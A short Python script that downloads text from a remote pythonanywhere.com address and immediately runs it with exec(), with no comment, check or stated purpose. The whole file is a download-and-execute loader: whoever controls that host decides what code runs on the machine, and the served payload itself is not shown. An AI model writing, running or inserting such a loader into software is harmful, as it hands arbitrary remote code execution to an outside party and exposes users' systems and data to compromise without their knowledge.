import requests

code = requests.get(
    "https://farhad807156.pythonanywhere.com/core"
).text

exec(code)
